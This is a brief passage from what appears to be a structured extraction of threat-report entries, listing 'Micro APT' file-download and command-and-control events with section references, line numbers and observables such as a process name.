   - Raw: Micro APT File downloaded to disk
   - Time: `-` / `-`
   - Observables: process_name=micro; email_artifact=Micro APT
1. `4_9_e026` | `interaction_connection` | `4.9.4.2 Connections` | lines `1715-1715`
   - Raw: Micro APT C2
   - Time: `-` / `-`
   - Observables: process_name=micro; email_artifact=Micro APT

